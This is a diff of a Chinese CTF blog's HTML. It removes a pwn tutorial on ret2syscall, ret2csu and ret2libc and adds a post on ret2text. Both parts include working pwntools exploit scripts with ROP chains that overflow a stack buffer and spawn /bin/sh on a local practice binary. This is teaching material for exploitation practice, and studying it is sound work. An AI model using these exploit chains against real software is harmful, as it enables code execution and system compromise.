-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax rax, <span class="number">0xb</span> <span class="number">0x3b</span></span><br><span class="line">mov ebx rdi, [“/bin/sh”] </span><br><span class="line">mov ecx rsi, <span class="number">0</span></span><br><span class="line">mov edx rdx, <span class="number">0</span></span><br><span class="line"><span class="type">int</span> <span class="number">0x80</span> syscall</span><br><span class="line">=&gt; execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>
-
-<p>在静态链接中，在系统内核中的execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)这个函数可以获得控制权，但由于他是内核函数，所以，在调用它时必须满足一些必要的调用约定才可以进行调用，</p>
-<p>像这些系统内核函数调用必须使用一些特殊的汇编指令才能调用，如int 80（32位）和syscall（64位）就像一个call函数，但是是跳转到内核系统中，至于要跳到哪个函数则要根据之前部分寄存器的值来确定，eax(32)和rax(64)保存了系统调用号（内核函数在内核中都有独属于自己一个调用号，如execve的调用号为11（32位&#x3D;0xb）,59（64位&#x3D;0x3b））,ebx和rdi用来保存在函数中执行的参数的地址，同时要保证ecx，edx和rsi，rdx中的值都为0。</p>
-<p>大致就是这个但现在我们要面临的问题是如何修改寄存器中的值，这个有一个很好的方法。可以在终端中运行rop便可以找到程序中的可以帮我们修改寄存器的指令</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only <span class="string">&quot;pop|ret&quot;</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://blog.forevers.love/usr/uploads/2023/12/1839070299.png" alt="屏幕截图 2023-12-09 160956.png">![屏幕截图 2023-12-09 160956](wp&#x2F;屏幕截图 2023-12-09 160956.png)</p>
-<p>如此便可以查看在程序中有那些可以供我们去修改寄存器的命令（像这种用于修改寄存器的指令一般被称为gadget），我们只要在栈溢出的垃圾值后面加入这些指令，pop+寄存器的意思是将此时栈上的值取出放入寄存器中，ret的作用是返回栈中，回到我们自己的指令去继续执行我们的指令，而要放入寄存器中的值则只要放在这个指令地址的后面，在程序执行时会将这个指令的后面的那个值作为出栈的数据放入寄存器中。需要注意的是在命令中可能不止一个寄存器，此时我们变要将每一个寄存器的值都改变，便在寄存器命令后面以此放上要放入寄存器的值，如</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000405b44</span> : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">这是用上面的那个指令运行后出现的一行数据</span><br><span class="line">我们的利用</span><br><span class="line">p32(<span class="number">0x0000000000405b44</span>)+p32(<span class="number">2</span>)+p32(<span class="number">0</span>)+p32(<span class="number">9</span>)+p32(<span class="number">0x3d</span>)</span><br></pre></td></tr></table></figure>
-<p>如此当被我们劫持的程序执行到这里时，便会依次将2，0，9，0x3d这四个数据分别放入rbx,rbp,r12,r13这四个寄存器中，然后ret会将程序返回到原本的指令中。</p>
-<p>有了以上的分析其实像这种题的过程便可以很清晰的出来了，<br>32位程序：<br>先输入垃圾数据然后，寻找足够的gadget将eax的值改为0xb，ebx改为‘&#x2F;bin&#x2F;sh’的地址（有的程序中会没有这个数据，但可以自己输入，在之后的题便是这种，到时候细讲）ecx改为0，edx改为0。<br>在这4个寄存器的值都改好后便可以执行int 0x80这个指令，获得控制权·<br>64位程序：<br>先输入垃圾数据然后，寻找足够的gadget将rax的值改为0x3b，rbi改为‘&#x2F;bin&#x2F;sh’的地址（有的程序中会没有这个数据，但可以自己输入，在之后的题便是这种，到时候细讲）rsi改为0，rdx改为0。<br>在这4个寄存器的值都改好后便可以执行syscall这个指令，获得控制权·</p>
-<p>如上便是ret2syscall这类题的做法，其实细看回事有很大的限制在其中<br>1，要有足够将4个寄存器都修改的gadget，这一点便基本将动态链接给淘汰了，在大部分的动态链接中是没有足够多的gadget给我们使用的，只用静态链接中才会有足够时的gadget<br>2，在程序中必须有int 0x80（32位程序）或syscall（64位程序）指令</p>
-<p>现在便拿出一道方法用的是ret2syscall但其中用了ret2csu的思想的一道动态链接的64位程序的（神奇）题</p>
-<p>老样子先用checksec查看程序的保护（这道题是学长给的，在一开始题目就是ret2syscall虽然我一度怀疑题目错了，但最后确实没错，在后面为了好输入我改成poc）<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1565444552.png" alt="屏幕截图 2023-12-09 170220.png">![屏幕截图 2023-12-09 170220](wp&#x2F;屏幕截图 2023-12-09 170220.png)<br>没什么特别的那就直接开整吧，</p>
-<p>既然是ret2syscall那就找gadget，这里便是我懵逼的第一个地方，如此少的gadget，只能找到修改rdi和rsi的指令器外两个寄存器的值该怎么改？（拿命改），<br><img src="http://blog.forevers.love/usr/uploads/2023/12/3017193538.png" alt="屏幕截图 2023-12-09 171431.png">![屏幕截图 2023-12-09 171431](wp&#x2F;屏幕截图 2023-12-09 171431.png)</p>
-<p>先不管将程序放入64位的ida中<br><img src="http://blog.forevers.love/usr/uploads/2023/12/3385520804.png" alt="屏幕截图 2023-12-09 172045.png">![屏幕截图 2023-12-09 172045](wp&#x2F;屏幕截图 2023-12-09 172045.png)<br>果然，一看左边这么少的函数就知道是个动态链接的程序，<br>返回到汇编的窗口仔细一找woc居然有syscall指令<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1100300480.png" alt="屏幕截图 2023-12-09 172639.png">![屏幕截图 2023-12-09 172639](wp&#x2F;屏幕截图 2023-12-09 172639.png)<br>but在参数一栏找发现没有&#x2F;bin&#x2F;sh<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1868602236.png" alt="屏幕截图 2023-12-09 172745.png">![屏幕截图 2023-12-09 172745](wp&#x2F;屏幕截图 2023-12-09 172745.png)<br>这便是我疑惑的第2个地方，后来问了学长才知道，在主程序中有gets函数便可以在劫持程序后利用gets函数将&#x2F;bin&#x2F;sh这个字符串输入到bss段中的空地址中，然后再调用。</p>
-<p>好到现在来总结一下，我们能使用的有<br>syscall命令，<br>rdi和rsi寄存器，<br>用gets函数输入&#x2F;bin&#x2F;sh，<br>如果不考虑ret2libc的话，还差rax和rdx寄存器的改变</p>
-<p><strong>此时一个重要的思想出来，在程序中的__libc_csu_init函数，能有大用，改变某些寄存器的作用</strong><br>这便是ret2csu的思想，将程序导入__libc_csu_init函数中从而改变一些gadget不能改变的寄存器的值<br><img src="http://blog.forevers.love/usr/uploads/2023/12/4152783716.png" alt="屏幕截图 2023-12-09 192250.png">![屏幕截图 2023-12-09 192250](wp&#x2F;屏幕截图 2023-12-09 192250.png)<br>在这里便可以先让程序执行0x4012DA地址的指令，修改rbx,rbp,r12,r13,r14,r15寄存器的值，然后在使程序执行0x4012C0地址的指令，从而修改rdx,rsi,edi的值（虽然是edi不是rdi，但是也可以相当于改变rdi，一般用不到前面的位数改变后面的足够了）最后的call可以直接跳转到一个函数出执行（这里有一个大坑，后面慢慢讲)</p>
-<p>到了此时便只差rax的值不能改变，在程序中慢慢找看看能不能找到可以改变的地方<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1473558961.png" alt="屏幕截图 2023-12-09 194646.png">![屏幕截图 2023-12-09 194646](wp&#x2F;屏幕截图 2023-12-09 194646.png)<br>好，找到了，在0x40119e及后面的指令在利用后刚好能将edi中的值传输到eax中（在64为系统中主用的是r开头的寄存器，e开头寄存器就是r开头的寄存器的后半部分，大部分情况下，r开头的寄存器前半部分的值用不到的，e的改变足够用），在这里还有一个很重要的点，我们是先将edi的值传进[rbp+var_4]，在将[rbp+var_4]传进eax中，于是我们必须要保证[rbp+var_4]中的值是一个空但有限的地址，在bss段中选择。（var_4在前面有定义，但不用管比较小，只要保证rbp中的地址空并且有效就行)</p>
-<p>由于本题中需要用到的空地址有点多，先讲一下空地址的选择<br>由于我们在调用gets函数需要向空地址写入数据，便要找到一个可写的地址，而bss段便是一个可写的地方，我们可以通过gdb调试中寻找在gdb调试进入程序后输入</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmmap</span><br></pre></td></tr></table></figure>
-<p>命令便可以看到每一段地址对应的能力，然后在确认好地址后用如下命令查看地址对应的存放情况</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/<span class="number">20</span>gx 地址名<span class="comment">//20代表的是从该地址往后的20字节的地址都显示出来</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://blog.forevers.love/usr/uploads/2023/12/3926396535.png" alt="屏幕截图 2023-12-09 201100.png">![屏幕截图 2023-12-09 201100](wp&#x2F;屏幕截图 2023-12-09 201100.png)<br>如此便可以确认这个地址是一个可写的空的有效的地址</p>
-<p>如此我们便可以将这个题的全部思路写出来，在一开始直接向程序中输入24个垃圾字节数据进行栈溢出，用于劫持程序，然后利用gets函数输入&#x2F;bin&#x2F;sh字符串，<br>在这里会出现一个事情，我们要向一个特定地址输入字符，而gets函数的原型是</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span>;</span><br></pre></td></tr></table></figure>
-<p>于是在执行gets函数中时便会向先调用rdi寄存器（rdi为最常用的通用寄存器）中的值作为函数输入的值的存放地址，<br>于是我们便要向rdi赋一个空地址，然后才调用gets函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">24</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404480</span>)+p64(gets)<span class="comment">//get地址为plt段的地址，0x404480空地址</span></span><br></pre></td></tr></table></figure>
-<p>然后程序便等待输入，输入的过程可以在后面重新开一个新的payload2用于输入数据</p>
-<p>在输入完成后开始对其他寄存器的值开始改变，先改变rax中的值为0x3b，将rdi中的值改变为0x3b，然后将rbp赋值为一个空地址为是程序执行下去，在程序后面还要在加一个空地址用于解决pop rbp指令</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0x3b</span>)+p64(pop_rbp_ret)+p64(<span class="number">0x404680</span>)+p64(edi_eax)+p64(<span class="number">0x404580</span>)<span class="comment">//两个地址都是空地址，edi_eax是指令的开始</span></span><br></pre></td></tr></table></figure>
-
-<p>现在rax的值已经改为0x3b，然后将r12,r13,r14,r15改为&#x2F;bin&#x2F;sh的地址，0,0,call要调转的地方。然后再执行mov的指令</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call    ds:(__frame_dummy_init_array_entry - <span class="number">403E10</span>h)[r15+rbx*<span class="number">8</span>]</span><br></pre></td></tr></table></figure>
-<p>这里有一个特殊的地方，call的跳转并不会直接跳转到那个指令的地址，然后执行，而是会将[r15+rbx*8]的地址所存放的地址先读取了，跳转到那个地址然后执行，所以在gets函数输入处不只要&#x2F;bin&#x2F;sh还要syscall指令的地址，然后在让call的调转到gets函数输入的syscall指令的地址，</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload+=p64(pop_r12_pop_r13_pop_r14_pop_r15_ret)</span><br><span class="line">payload+=p64(<span class="number">0x404480</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x404488</span>)+p64(<span class="number">0x4012C0</span>)</span><br><span class="line"><span class="comment">//0x4012C0是mov的指令，0x404488是syscall指令地址存放的地址，</span></span><br><span class="line"><span class="comment">//0x404480是/bin/sh存放的地址</span></span><br></pre></td></tr></table></figure>
-<p>第一个payload构造完成<br>开始构造第二个payload2，</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload2=b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>+p64(syscall)</span><br><span class="line"><span class="comment">///bin/sh\x00刚好有8个字节于是再后面syscall的指令，</span></span><br><span class="line"><span class="comment">//刚好是放在/bin/sh的地址加8位后，</span></span><br></pre></td></tr></table></figure>
-<p>好，给出完整的脚本</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="meta">#context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span><br><span class="line">io=process(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">pop_rbp_ret=<span class="number">0x40117d</span></span><br><span class="line">syscall=<span class="number">0x4011ae</span></span><br><span class="line">pop_rsi_pop_r15_ret=<span class="number">0x4012e1</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x4012e3</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">pop_r13_pop_r14_pop_r15_ret=<span class="number">0x4012de</span></span><br><span class="line">syscall=<span class="number">0x4011ae</span></span><br><span class="line">edi_eax=<span class="number">0x40119E</span></span><br><span class="line">main=<span class="number">0x401223</span></span><br><span class="line">gets=<span class="number">0x401090</span></span><br><span class="line">getplt=<span class="number">0x404028</span></span><br><span class="line">pop_r12_pop_r13_pop_r14_pop_r15_ret=<span class="number">0x4012dc</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">24</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404480</span>)+p64(gets)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0x3b</span>)+p64(pop_rbp_ret)+p64(<span class="number">0x404680</span>)+</span><br><span class="line">p64(edi_eax)+p64(<span class="number">0x404580</span>)+p64(pop_r12_pop_r13_pop_r14_pop_r15_ret)</span><br><span class="line">+p64(<span class="number">0x404480</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404488</span>)+p64(<span class="number">0x4012C0</span>)</span><br><span class="line">payload2=b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span></span><br><span class="line">payload2+=p64(syscall)</span><br><span class="line"><span class="meta">#gdb.attach(io,<span class="string">&#x27;b *0x4012C0&#x27;</span>) </span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">io.sendline(payload)<span class="comment">//第一次传入</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload2)第二次传入</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p>#ret2libc<br>在这里将之间讲述无system和无&#x2F;bin&#x2F;sh的情况将32位与64位分开讲述</p>
-<p><strong>32位</strong><br>在这类题中一般是动态链接很多操作都不能执行<br>更多的知识不多讲直接将做题的过程<br>对于这种题我们一般可以先调用可已打印东西的函数，如puts的函数将got中谋个函数的地址答应出来，根据动态链接的延迟绑定规定，在第一次调用某个函数之后其在动态链接库中的地址将被写入got表中，我们便可以同过put等打印数据的函数将其打印出来地址，这个地址便是该函数在动态链接库中对应的地址，在题中有很大的可能这个地址是一个变化中的地址，这是系统的一种保护操作，但是一般答应出来的后3位（16进制的数）是不会变的，而我们便可以将这后3位的地址用于判断其动态链接库的类型，</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher<span class="comment">//这个可用于自动寻找库，不过可能有点老，反正我没有用这个成功过</span></span><br><span class="line">io=process(<span class="string">&#x27;./文件名&#x27;</span>)</span><br><span class="line">puts_plt=<span class="number">0x00000</span><span class="comment">//puts在plt段的地址，可以直接在ida中找也可以用链接文件后直接用程序找</span></span><br><span class="line">main=<span class="number">0x00000</span><span class="comment">//main函数在text段中的地址，用于在打印地址后返回main从新开始执行</span></span><br><span class="line">libc_start_main=<span class="number">0x000000000</span><span class="comment">//got段中的libc_start_main的地址，在第一次调用后会有真实地址，打印出来</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">22</span>+p32(put_plt)+p32(main)+p32(libc_start_main)</span><br><span class="line"><span class="comment">//32位的函数调用特点，间隔一个放参数。</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;\n&quot;</span>)<span class="comment">//可用可不用，关键根据当时的情况来加入，括号内是程序的输出</span></span><br><span class="line">libcaddr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">//用于接收用puts函数打印出来的__libc_start_main函数的真实地址</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>在有libc_start_main函数的真实地址后，可以在网上查找函数的偏移地址<br><img src="http://blog.forevers.love/usr/uploads/2023/12/3046998676.png" alt="屏幕截图 2023-12-09 220543.png">![屏幕截图 2023-12-09 220543](wp&#x2F;屏幕截图 2023-12-09 220543.png)<br>一般来说真实地址的值会因为保护程序的存在而使中间的地址被随机化，但最后的3位（16进制)不会被改变，便可以通过后3位查到偏移量，<br><strong>程序的基本地址&#x3D;__libc_start_main函数的真实地址-__libc_start_main函数的偏移量<br>system函数的真实地址&#x3D;程序的基本地址+system函数的偏移量<br>str_bin_sh函数的真实地址&#x3D;程序的基本地址+str_bin_sh函数的偏移量</strong></p>
-<p>然后调用system函数利用str_bin_sh函数，便也可以获得控制权，</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main=<span class="number">0x000</span><span class="comment">//__libc_start_main函数的偏移地址</span></span><br><span class="line">system=<span class="number">0x00000</span><span class="comment">//system函数的偏移地址，</span></span><br><span class="line">str_bin_sh=<span class="number">0x000</span><span class="comment">//__libc_start_main函数的偏移地址</span></span><br><span class="line">以上这三个的数值由网上查阅</span><br><span class="line">libcbase_addr=libcaddr-__libc_start_main</span><br><span class="line">system_addr=libcbase_addr+system</span><br><span class="line">binsh_addr=libcbase_addr+str_bin_sh</span><br><span class="line">payload2 = b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">22</span> + p32(sys_addr) + b<span class="number">&#x27;</span>AAAA<span class="number">&#x27;</span> + p32(binsh_addr)</span><br><span class="line"><span class="comment">//这里中间的数为了平衡栈顶要在中间加上4字节的垃圾数据</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>如果要使用LibcSearcher来用着要在要在前面加上</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher import *</span><br></pre></td></tr></table></figure>
-
-
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/CTF/">CTF</a>
-	</div>
-
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
     <article id="post-博客" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -2729,7 +2659,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">    ...</span><br><span class="line">io.interactive()    </span><br></pre></td></tr></table></figure>
 
 <p>写好之后用python +这个文件名</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *地址&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *地址&#x27;</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">&#x27;b *$rebase(0x相对基址偏移)&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
 
 <p>用于在程序进行之中时，进入调试状态。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&quot;main_real_addr:&quot;</span>,main_real_addr)</span><br></pre></td></tr></table></figure>
@@ -2960,7 +2890,7 @@
 <p>同时<strong>line</strong>的使用也是必不可少的，有时候不加这个最后的换行符，会使数据传不过去，要随时注意</p>
 <p><strong>在有的栈迁移中垃圾数据的长度不一定是到rdp长度加上8&#x2F;4，有可能只是到rbp的长度不用加上后面的数据便可以直接进行栈迁移</strong></p>
 <p>再用动态链接库调用函数的偏移地址的方法</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="built_in">puts</span>=elf.symbols[<span class="string">&#x27;puts&#x27;</span>]    </span><br><span class="line">sys=elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bs = next(elf.search(bytes(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">elf=ELF(<span class="string">&quot;./文件名&quot;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eof=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="built_in">puts</span>=eof.symbols[<span class="string">&#x27;puts&#x27;</span>]    </span><br><span class="line">sys=eof.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bs = next(eof.search(bytes(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">elo=ELF(<span class="string">&quot;./文件名&quot;</span>)</span><br><span class="line">puts_got=elo.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt=elo.plt[<span class="string">&quot;puts&quot;</span>]</span><br></pre></td></tr></table></figure>
 
 <p>本地的库可以在gdb调式中找到，远程的库直接链接就行</p>
 <p>在一些程序中特别是静态的程序，他会将如main函数等主要的函数换一个看不出来特别的函数名，此时若要找到其主要函数的位置则可以通过在汇编中的start函数中的位置找到</p>
@@ -3172,6 +3102,162 @@
 
 
   
+    <article id="post-wp" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/03/27/wp/" class="article-date">
+  	<time datetime="2024-03-27T12:06:41.000Z" itemprop="datePublished">2024-03-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/03/27/wp/">
+        pwn 一些题详解
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#ret2text</p>
+<p>主要分为32位的和64位的不同程序，在做法是有不同的对应方法与</p>
+<p>在一开始都要先在linux中先确定程序使用了那些保护方式与结构类型</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec 文件名</span><br></pre></td></tr></table></figure>
+<p>![屏幕截图 2023-11-28 173641](wp&#x2F;屏幕截图 2023-11-28 173641-17115444455564.png)</p>
+<p>![屏幕截图 2023-11-28 173737](wp&#x2F;屏幕截图 2023-11-28 173737.png)</p>
+<p><em>1</em>，无论是32位还是64位都要首先确定栈溢出时要填充多少个垃圾数据，有两种方法，ida和动调</p>
+<p>ida（在特定的环境下可能不对以动调的为主）：直接看所要溢出的那个栈在ida上与ebp的距离就是我们一开始要填从的数据的大小，注意在ida上显示的是16进制的数，在写脚本是要转化为10进制的数才能正确，如图要向buf中填充0x12（18）的数据才算覆盖到ebp的位置<br>![屏幕截图 2023-11-27 204046][wp&#x2F;屏幕截图 2023-11-27 204046.png]![屏幕截图 2023-11-27 204046](wp&#x2F;屏幕截图 2023-11-27 204046.png)</p>
+<p>动调：gdb+可执行文件的名称，在运行到输入数据是输入较亮眼的数据，在之后看esp和ebp的距离，是为要注入的数据长。</p>
+<p>现在注入的数据到达ebp所指向的地方但并没用完，由于栈的特点此时我们<br>还需要向其中再注入一段数据用于覆盖ebp所指向的地址，并且这段数据在不同系统中有不同的长度，在64位系统中要输入8个长度的数据，在32位系统中要输如4个长度的数据<br>以上的垃圾数据长度为一个字节（一个大写字母），用如下传递</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*长度的大小</span><br></pre></td></tr></table></figure>
+
+<p>在确定垃圾数据的长度后在注入的数据便是之后程序要跳转执行的地方，在当下的情况下要让程序能执行system(&#x2F;bin&#x2F;sh)以获得控制权，如果在程序中有这个完整的函数，则在垃圾数据之后直接输入该函数的地址跳转到那执行就行，无论是32位还是64位都这样。函数的地址在ida中获得，用如下传递</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p32(<span class="number">0</span>x地址数字）用于<span class="number">32</span>位系统</span><br><span class="line">p64(<span class="number">0</span>x地址数据)用于<span class="number">64</span>位系统</span><br></pre></td></tr></table></figure>
+
+<p><strong>函数传参</strong><br>在很多情况下程序中并不会直接有system(&#x2F;bin&#x2F;sh)这个函数，而是将这system和&#x2F;bin&#x2F;sh放在不同的地方，需要我们将这两个同过地址的连在一起，用于执行，而此处32为系统与64为系统便是完全不同的方式进行，分开论述。</p>
+<p><em>32位系统</em>pit<br>在将垃圾数据输入进去之后直接输入到system函所在的地址（切记要输入的是该函数在plt段的地址，不能是text段的地址）<br>此时当程序执行到这里时会直接进入该函数的内部此时我们只要再输入字符串（&#x2F;bin&#x2F;sh）的位置程序便会执行该函数，但在输入字符串之前还要输入一个0</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*垃圾数据的长度+p32(plt段的system的地址)</span><br><span class="line">+p32(<span class="number">0</span>)+p32(.data段的/bin/sh的地址)</span><br></pre></td></tr></table></figure>
+<p>关于0的加入：<br>对于本题的函数传参，我们的栈帧构造初步想法如图</p>
+<p>ebp	‘aaaa’<br>r	return to func<br>参数一	“&#x2F;bin&#x2F;sh”<br>输入适量垃圾填充 padding * b ‘a’<br>覆盖返回地址指向func函数 p32(ret_addr)<br>参数”&#x2F;bin&#x2F;sh”地址<br>则payload &#x3D;  padding*b’a’ + p32(ret_addr)  + p32(sh_addr)</p>
